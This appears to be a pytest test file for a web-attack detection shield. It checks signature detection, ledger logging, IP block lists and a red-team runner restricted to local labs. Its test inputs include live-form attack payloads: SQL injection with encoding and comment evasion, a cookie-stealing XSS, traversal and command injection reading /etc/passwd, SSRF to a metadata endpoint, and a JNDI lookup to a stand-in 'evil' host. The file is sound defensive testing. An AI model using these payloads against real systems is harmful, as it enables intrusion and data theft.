"""HTTP shield: the signature engine catches encoded and comment-evaded web attacks while leaving benign traffic
alone; the shield records each detection to the ledger, drives the autopilot, maintains a block list, and the
red-team runner refuses any target that is not a local lab."""

import shutil
import sqlite3
from pathlib import Path

import pytest

from backend.app.engine import redteam, webattack

ROOT = Path(__file__).resolve().parents[1]
DB = ROOT / "data" / "ews.db"


# --- signature engine ------------------------------------------------------------------------------------------
@pytest.mark.parametrize("event, family, severity", [
    ({"path": "/search", "query": "q=' OR 1=1--"}, "sqli", "High"),
    ({"path": "/search", "query": "q=%27%20OR%201%3D1--"}, "sqli", "High"),              # URL-encoded
    ({"path": "/p", "query": "id=1'/**/UNION/**/SELECT/**/pw/**/FROM/**/users"}, "sqli", "Critical"),  # comment-evaded
    ({"path": "/c", "query": "x=<script>document.cookie</script>"}, "xss", "High"),
    ({"path": "/c", "query": "x=<img src=x onerror=alert(1)>"}, "xss", "High"),
    ({"path": "/d", "query": "file=../../../../etc/passwd"}, "traversal", "High"),
    ({"path": "/api", "body": '{"n":"; cat /etc/passwd"}', "headers": {"content-type": "application/json"}}, "cmdi", "Critical"),
    ({"path": "/t", "query": "name={{7*7}}"}, "ssti", "High"),
    ({"path": "/f", "query": "url=http://169.254.169.254/latest/meta-data/"}, "ssrf", "High"),
    ({"path": "/", "headers": {"x-api-version": "${jndi:ldap://evil/a}"}}, "jndi", "Critical"),
    ({"path": "/.env"}, "probe", "Medium"),
    ({"path": "/", "headers": {"user-agent": "sqlmap/1.8"}}, "scanner", "Medium"),
])
def test_engine_catches_attacks(event, family, severity):
    r = webattack.inspect(event)
    assert r["worst"] == severity, r
    assert any(f["family"].split(".")[0] == family for f in r["findings"]), r


@pytest.mark.parametrize("event", [
    {"path": "/search", "query": "q=smart meter firmware"},
    {"path": "/products", "query": "category=electronics&sort=price&page=2"},
    {"path": "/login", "body": "user=priya&pass=hunter2", "headers": {"content-type": "application/x-www-form-urlencoded"}},
    {"path": "/article/how-to-read-your-bill"},
    {"path": "/greet", "query": "name=Priya Sharma"},
])
def test_engine_leaves_benign_traffic_alone(event):
    assert webattack.inspect(event)["worst"] is None, webattack.inspect(event)


def test_evidence_is_defanged():
    r = webattack.inspect({"path": "/x", "query": "q=<script>alert(1)</script>\x00\x07"})
    ev = r["findings"][0]["evidence"]
    assert "\x00" not in ev and "\x07" not in ev
    assert len(webattack.redact("A" * 500)) <= 181


# --- shield state (needs the built database) -------------------------------------------------------------------
@pytest.fixture
def shield(tmp_path):
    if not DB.exists():
        pytest.skip("data/ews.db not built")
    copy = tmp_path / "ews.db"
    shutil.copy(DB, copy)

    def connect():
        conn = sqlite3.connect(copy, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        return conn

    from backend.app.shield import Shield
    return Shield(connect)


def test_clean_request_is_allowed_and_unrecorded(shield):
    r = shield.ingest({"app": "t", "method": "GET", "path": "/search", "query": "q=lamp", "source_ip": "10.0.0.9"})
    assert r["decision"] == "allow" and r["findings"] == []
    assert shield.status()["stats"]["attacks"] == 0


def test_attack_is_detected_and_written_to_the_ledger(shield):
    r = shield.ingest({"app": "portal", "name": "Portal", "org_id": "PWR-01", "method": "GET",
                       "path": "/search", "query": "q=' OR 1=1--", "source_ip": "203.0.113.7"})
    assert r["decision"] == "allow"                       # monitor mode: detect, do not drop
    assert r["worst"] in ("High", "Critical")
    conn = shield.connect()
    n = conn.execute("SELECT COUNT(*) FROM ledger WHERE kind LIKE 'shield.detect.%'").fetchone()[0]
    assert n >= 1
    st = shield.status()
    assert st["stats"]["attacks"] == 1
    assert st["attackers"][0]["ip"] == "203.0.113.7"


def test_block_mode_drops_and_blocklists(shield):
    shield.register("portal", {"name": "Portal", "org_id": "PWR-01", "mode": "block"})
    r = shield.ingest({"app": "portal", "method": "GET", "path": "/d",
                       "query": "file=../../../../etc/passwd", "source_ip": "203.0.113.8"})
    assert r["decision"] == "block" and r["blocked"] is True
    assert "203.0.113.8" in shield.policy()["blocklist"]
    # A subsequent request from the same source is blocked even if benign.
    r2 = shield.ingest({"app": "portal", "method": "GET", "path": "/", "source_ip": "203.0.113.8"})
    assert r2["decision"] == "block"


def test_brute_force_is_detected_behaviourally(shield):
    for _ in range(9):
        shield.ingest({"app": "portal", "method": "POST", "path": "/login",
                       "body": "user=admin&pass=x", "status": 401, "source_ip": "198.51.100.5",
                       "headers": {"content-type": "application/x-www-form-urlencoded"}})
    assert any("bruteforce" in f for f in shield.status()["families"])


def test_analyst_block_and_unblock(shield):
    shield.block("203.0.113.9", "manual")
    assert "203.0.113.9" in shield.policy()["blocklist"]
    shield.unblock("203.0.113.9")
    assert "203.0.113.9" not in shield.policy()["blocklist"]


# --- red-team runner safety ------------------------------------------------------------------------------------
@pytest.mark.parametrize("url, ok", [
    ("http://127.0.0.1:8080", True),
    ("http://localhost:3000", True),
    ("http://192.168.1.10", True),
    ("http://10.0.0.5:8080", True),
    ("http://example.com", False),
    ("https://8.8.8.8", False),
    ("http://169.254.169.254", False),
])
def test_redteam_only_targets_local_labs(url, ok):
    assert redteam._target_ok(url)[0] is ok


def test_redteam_catalogue_has_attacks_and_controls():
    cat = redteam._cases()
    assert {"sqli", "xss", "traversal", "cmdi", "inject", "recon", "bruteforce"} <= set(cat)
    for scen in cat.values():
        assert any(c["kind"] == "attack" for c in scen["cases"])
